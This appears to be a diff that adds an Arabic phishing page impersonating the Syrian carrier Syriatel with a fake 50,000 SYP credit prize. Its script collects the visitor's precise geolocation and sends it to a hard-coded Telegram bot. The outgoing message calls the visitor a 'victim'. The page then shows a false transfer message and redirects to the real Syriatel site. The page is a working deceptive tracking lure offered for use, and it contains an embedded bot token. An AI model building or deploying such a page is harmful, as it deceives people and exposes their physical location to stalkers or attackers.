@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مسابقة ربح رصيد سيريتل 2024</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f4; text-align: center; padding: 50px 20px; }
+        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+        h1 { color: #e30613; font-size: 24px; }
+        p { color: #333; font-size: 18px; }
+        .btn { background-color: #e30613; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 18px; font-weight: bold; width: 100%; margin-top: 20px; }
+        .footer { margin-top: 20px; font-size: 12px; color: #888; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/en/b/b2/Syriatel_logo.png" alt="Syriatel" style="width: 100px;">
+    <h1>مبروك! أنت مؤهل لربح رصيد</h1>
+    <p>اضغط على الزر أدناه لتفعيل الوصول واستلام رصيد بقيمة 50,000 ل.س فوراً.</p>
+    <button class="btn" onclick="getLocation()">استلام الرصيد الآن</button>
+    <div class="footer">يجب السماح بالوصول للموقع للتأكد من وجودك داخل التغطية.</div>
+</div>
+
+<script>
+const botToken = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
+const chatId = "8397194527";
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendPosition, showError);
+    } else {
+        alert("متصفحك لا يدعم هذه الميزة.");
+    }
+}
+
+function sendPosition(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+    const accuracy = position.coords.accuracy;
+    
+    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+    const message = `📍 تم تحديد موقع ضحية جديد:\n\nرابط الموقع: ${mapUrl}\nالدقة: ${accuracy} متر`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+    .then(() => {
+        alert("جاري معالجة الطلب... سيتم تحويل الرصيد خلال دقائق.");
+        window.location.href = "https://www.syriatel.sy/";
+    });
+}
+
+function showError(error) {
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            alert("يجب عليك السماح بالوصول للموقع للحصول على الجائزة.");
+            break;
+        default:
+            alert("حدث خطأ في النظام، حاول لاحقاً.");
+    }
+}
+</script>
+
+</body>
+</html>
